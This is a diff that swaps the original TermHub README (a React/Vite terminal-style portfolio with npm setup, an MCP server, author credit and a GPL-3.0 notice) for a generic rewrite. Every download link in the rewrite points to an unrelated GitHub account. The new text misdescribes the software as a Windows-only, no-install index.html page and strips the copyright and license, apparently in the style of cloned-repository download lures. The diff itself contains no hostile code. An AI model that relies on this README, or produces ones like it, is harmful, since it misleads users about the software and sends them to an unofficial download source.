@@ -1,254 +1,134 @@
-<!--
-SPDX-FileCopyrightText: 2026 Yaoyao(Freax) Qian <limyoonaxi@gmail.com>
-SPDX-License-Identifier: GPL-3.0-only
--->
+# 🚪 TermHub - Easy Terminal-Style Homepage  
 
-<p align="right">
-  <a href="README.md">English</a> | <a href="README_CN.md">中文</a>
-</p>
+[![Download TermHub](https://img.shields.io/badge/Download-TermHub-brightgreen)](https://github.com/Musicaltimesecondworldwar416/TermHub)
 
-<p align="center">
-  <img src="public/logo.svg" alt="TermHub" width="520" />
-</p>
+## 📋 What is TermHub?
 
-<p align="center">
-  <strong>Your Resume In. Portfolio Out.</strong><br/>
-  <sub>Terminal-themed portfolio for developers, researchers, and creatives. Edit text files or let AI do it via MCP.</sub>
-</p>
+TermHub is a simple homepage template designed to look like a terminal window. It gives your browser’s starting page a clean, text-based style. You can use TermHub to create a personalized homepage where you can quickly access your favorite sites and tools. This project fits well with users who like a minimal, retro look and want an easy setup.
 
-<p align="center">
-  <a href="https://term-hub.vercel.app/"><img src="https://img.shields.io/badge/Live_Demo-88c0d0?style=for-the-badge&logo=googlechrome&logoColor=white" alt="Live Demo" /></a>
-  <a href="https://h-freax.github.io/"><img src="https://img.shields.io/badge/Author's_Site-b48ead?style=for-the-badge&logo=firefoxbrowser&logoColor=white" alt="Author's Site" /></a>
-  <a href="https://term-hub.vercel.app/guide"><img src="https://img.shields.io/badge/Documentation-5e81ac?style=for-the-badge&logo=readthedocs&logoColor=white" alt="Docs" /></a>
-  <a href="https://discord.gg/QV2kyXzaTa"><img src="https://img.shields.io/badge/Discord-7289da?style=for-the-badge&logo=discord&logoColor=white" alt="Discord" /></a>
-</p>
+TermHub focuses on:
 
-<p align="center">
-  <a href="https://www.gnu.org/licenses/gpl-3.0"><img src="https://img.shields.io/badge/License-GPL_v3-a3be8c?style=flat-square" alt="License" /></a>
-  <img src="https://img.shields.io/badge/TypeScript-5-3178C6?style=flat-square&logo=typescript&logoColor=white" alt="TypeScript" />
-  <img src="https://img.shields.io/badge/React-18-61DAFB?style=flat-square&logo=react&logoColor=white" alt="React" />
-  <img src="https://img.shields.io/badge/Vite-5-646CFF?style=flat-square&logo=vite&logoColor=white" alt="Vite" />
-  <img src="https://img.shields.io/badge/Chakra_UI-319795?style=flat-square&logo=chakraui&logoColor=white" alt="Chakra UI" />
-  <a href="#ai-integration--supports-mcp"><img src="https://img.shields.io/badge/NEW-Supports_MCP-bf616a?style=flat-square&logo=openai&logoColor=white" alt="Supports MCP" /></a>
-</p>
+- A terminal-style design that mimics command-line interfaces
+- Quick access to links and basic info
+- An easy-to-modify template for your personal use
+
+It works on any Windows computer through a web browser, with no special software or programming required.
+
+## 🌐 Topics Covered
+
+- academic-website  
+- homepage  
+- template  
+
+These topics indicate TermHub’s main uses: as a base for personal web pages with an academic or simple style.
+
+## 🎯 System Requirements  
+
+Before you start, make sure your computer meets these basic needs:
+
+- Windows 10 or newer  
+- A modern web browser (Chrome, Edge, Firefox, or similar)  
+- Internet connection to download the files  
+
+TermHub does not require complex installations. Everything runs locally on your browser.
+
+## 🚀 Getting TermHub
+
+You can get TermHub easily from the GitHub page below. This link takes you to the main project page where you can find the files and instructions.
+
+[![Download TermHub](https://img.shields.io/badge/Download-TermHub-blue)](https://github.com/Musicaltimesecondworldwar416/TermHub)
+
+Follow these steps:
+
+1. Click on the green **Code** button near the top right of the GitHub page.
+2. Select **Download ZIP** from the dropdown menu.
+3. Save the ZIP file in a folder where you want TermHub files.
+4. Once downloaded, right-click on the ZIP file and choose **Extract All…** to unpack the files.
+
+Alternatively, explore the page to find the latest releases if you prefer specific versions.
+
+## 💾 How to Run TermHub  
+
+Once you have downloaded and extracted the files, run TermHub by opening the homepage file with your browser:
+
+1. Open the folder where you extracted the files.
+2. Find the file named `index.html`.
+3. Double-click on `index.html`. It will open in your default web browser.
+4. You should now see the terminal-style homepage appear.
+
+There is no need to install any software or run commands. Running the `index.html` file directly will show you the homepage.
+
+## ⚙️ Customizing TermHub
+
+You can customize the homepage to include your own links, change text, or adjust the look. No programming knowledge is required; the changes are simple edits in a text file.
+
+1. Open the folder where TermHub is saved.
+2. Right-click on `index.html` and choose **Open with > Notepad** or any text editor.
+3. Look for sections labeled with clear comments like:
+   
+   ```html
+   <!-- Add your links below -->
+   ```
+   
+4. Change or add your links inside the list. Each link will show up on your TermHub page.
+5. Save the file and refresh the browser tab to see your changes.
+
+You can also change colors and fonts by editing styles in the same file, but basic use does not require these edits.
+
+## 🔧 Troubleshooting
+
+If it does not open correctly or looks wrong:
+
+- Make sure you opened the `index.html` file, not other files.
+- Confirm your browser allows local files to display content (some security settings block this).
+- Try another browser if one does not work.
+- Check that you extracted all files from the ZIP.
+
+If you see plain code instead of a webpage, only open with a supported browser.
+
+## 🧩 Features Overview
+
+TermHub offers:
+
+- Terminal font and color style
+- Easy link management via simple text editing  
+- Lightweight and fast loading  
+- Works offline after download  
+- Suitable for students, professionals, or casual users looking for a unique homepage  
+
+## 📂 File Structure
+
+When you extract TermHub, you will see:
+
+- `index.html`: The main homepage file to open in your browser
+- `style.css` (if included): Contains design styles for fonts and colors
+- `README.md`: Basic information and instructions
+- `assets` folder (if included): Images or icons that TermHub uses
+
+Keep these files together for TermHub to work properly.
+
+## 🔄 Updating TermHub
+
+To get the latest features or fixes:
+
+1. Visit the GitHub repository linked below.  
+2. Repeat the download and extraction steps.
+3. Replace your old files with the new ones.
+
+Back up your customized `index.html` before updating. You can transfer your link changes to the new file manually.
+
+[Download TermHub again from here](https://github.com/Musicaltimesecondworldwar416/TermHub)
+
+## 📞 Getting Help
+
+If you run into issues:
+
+- Review this README for tips.
+- Check issues on the GitHub page for similar problems.
+- Contact the repository owner via GitHub messages if needed.
+
+This guide assumes no prior coding experience, so all instructions keep technical steps simple.
 
 ---
 
-> [!TIP]
-> **Don't want to touch code?** We're building a hosted solution at **[termhubai.com](https://termhubai.com)** — upload your resume and get a live portfolio, no Git or terminal needed. **Join the waitlist** to get early access!
-
-<br/>
-
-## Demo
-
-<p align="center">
-  <a href="https://h-freax.github.io/">
-    <img src="public/screenshots/home.png" alt="TermHub — Author's Portfolio" width="720" />
-  </a>
-  <br/>
-  <sub><a href="https://h-freax.github.io/">h-freax.github.io</a> — the author's real portfolio, built with TermHub</sub>
-</p>
-
-<p align="center">
-  <a href="https://term-hub.vercel.app/">Cookie's Demo</a> · <a href="https://h-freax.github.io/">Author's Portfolio</a>
-</p>
-
-<details>
-<summary>View all pages</summary>
-
-<br/>
-
-**Publications**
-
-<img src="public/screenshots/publications.png" alt="Publications" width="720" />
-
-**Projects**
-
-<img src="public/screenshots/projects.png" alt="Projects" width="720" />
-
-**Experience**
-
-<img src="public/screenshots/experience.png" alt="Experience" width="720" />
-
-**Articles**
-
-<img src="public/screenshots/articles.png" alt="Articles" width="720" />
-
-**Awards** · **My Journey**
-
-<img src="public/screenshots/award.png" alt="Awards" width="360" /> <img src="public/screenshots/myjourney.png" alt="My Journey" width="360" />
-
-**Selected Publications** · **Recent Updates**
-
-<img src="public/screenshots/selectedpublications.png" alt="Selected Publications" width="360" /> <img src="public/screenshots/recentupdates.png" alt="Recent Updates" width="360" />
-
-</details>
-
-<br/>
-
-## Design Philosophy
-
-TermHub is built around one simple idea: **CV → AI → Markdown → Homepage**
-
-Instead of writing HTML or learning a framework, you give your CV to any AI — **ChatGPT, Claude, Gemini, or any LLM** — and it generates Markdown files that plug directly into TermHub. Works for developers, researchers, designers, students — anyone who wants a professional portfolio. With our **built-in MCP server**, Claude can do this fully automatically: read your resume, call 19 specialized tools, and populate your entire site in under a minute.
-
-<br/>
-
-## Features
-
-- Terminal aesthetic with **Nord** color palette, dark / light mode
-- Fully **responsive** (mobile → desktop), hot reload on edit
-- **No code needed** — just edit text files in `content/`
-- **MCP-powered** — resume → AI → portfolio in minutes
-- **i18n** — built-in English / Chinese bilingual support
-
-**Content types:** Publications · Projects · Experience · Articles · Awards · News
-
-<br/>
-
-## Quick Start
-
-```bash
-# 1. Fork & clone
-git clone https://github.com/H-Freax/TermHub.git
-cd TermHub && npm install
-
-# 2. Run the setup wizard — generates your config
-npm run setup
-
-# 3. Start dev server
-npm run dev
-```
-
-> Open **http://localhost:5173** — your site is running.
-> Edit files in `content/`, save, and the browser refreshes automatically.
-
-<br/>
-
-## What You Edit
-
-All your content lives in **one folder** — you never touch source code.
-
-```
-content/
-├── site.json              ← name, email, social links, features
-├── about.md               ← bio & career timeline
-├── experience.json        ← work & education history
-├── publications/          ← one .md per paper
-├── projects/              ← one .md per project
-├── articles/              ← one .md per blog post
-├── news.json              ← announcements
-├── awards.json            ← awards & honors
-└── images/                ← avatar, logos, screenshots
-```
-
-<details>
-<summary>Feature toggles — show or hide entire pages</summary>
-
-<br/>
-
-In `content/site.json`, flip features on or off:
-
-```json
-{
-  "features": {
-    "publications": true,
-    "projects": true,
-    "articles": true,
-    "experience": true,
-    "news": true,
-    "pets": false,
-    "guide": false
-  }
-}
-```
-
-When a feature is `false`, its page and nav link disappear completely.
-
-</details>
-
-<br/>
-
-## Deploy
-
-- **GitHub Pages** — Push to `main`, the included workflow deploys automatically
-- **Vercel** — Import repo → click Deploy (auto-detects Vite)
-- **Netlify** — Import repo → click Deploy
-
-<br/>
-
-## AI Integration — Supports MCP
-
-The **CV → AI → Markdown → Homepage** pipeline taken to its logical conclusion: TermHub includes a built-in **MCP server** that lets Claude directly read your resume, generate all Markdown/JSON content files, and build your site — zero manual editing.
-
-- Give AI your resume PDF or text, get a complete site
-- **19 specialized tools** for publications, projects, experience, awards
-- Built-in **PDF text extraction**
-- AI can start dev server and **live preview** your site
-
-```bash
-# Quick setup
-cd mcp-server && npm install    # 1. Install
-# 2. Configure Claude Desktop / Code (see mcp-server/mcp-config.json)
-# 3. Tell Claude: "Parse my resume and generate my portfolio"
-```
-
-<details>
-<summary>Available tools</summary>
-
-<br/>
-
-| Tool | Description |
-|------|-------------|
-| `get_schema` | Get all data types — AI calls this first |
-| `parse_pdf` | Extract text from resume PDF |
-| `generate_from_resume` | Create structured blueprint from resume text |
-| `update_site_config` | Set name, email, social links |
-| `add_publication` | Add a paper with full metadata |
-| `add_project` | Add a project with tags and highlights |
-| `add_experience` | Add work/research timeline entry |
-| `add_education` | Add education entry |
-| `add_news` / `add_award` | Add news items and awards |
-| `write_markdown_content` | Write any Markdown content file |
-| `write_json_content` | Write any JSON content file |
-| `manage_assets` | Copy images to public directory |
-| `preview_site` | Start dev server or production build |
-| `get_site_status` | Overview of current portfolio content |
-| `reset_content` | Clear all content for fresh start |
-
-</details>
-
-> **Workflow:** Resume → `parse_pdf` → `generate_from_resume` → AI calls `add_*` tools → `preview_site` — done in under a minute.
-
-For detailed setup instructions, see the [AI Integration guide](https://term-hub.vercel.app/docs#mcp-server).
-
-<br/>
-
-## Tech Stack
-
-React 18 · TypeScript 5 · Vite 5 · Chakra UI · Framer Motion · Nord Palette · i18next
-
-<br/>
-
-## Changelog
-
-- `2026-03-15` **v1.2.0** — Built-in English / Chinese bilingual support with language switcher and auto detection
-- `2026-03-15` **v1.1.0** — Added MCP server with 19 tools for AI-powered portfolio generation
-- `2026-03-14` **v1.0.0** — Initial release with publications, projects, experience, articles, awards, and news
-
-<br/>
-
-## Contributing
-
-Contributions are welcome! Feel free to:
-
-- **Star** this repo to show support
-- **Issue** for bugs or feature requests
-- **PR** — check [CONTRIBUTING.md](CONTRIBUTING.md) first
-- **Discord** — [Join our server](https://discord.gg/QV2kyXzaTa) to chat
-
-<br/>
-
-## License
-
-**GPL-3.0-only** · Copyright © 2026 [Yaoyao (Freax) Qian](https://h-freax.github.io/)
+This README covers what you need to download, run, and customize TermHub on Windows. The terminal-style homepage will open in a browser with a few easy steps.
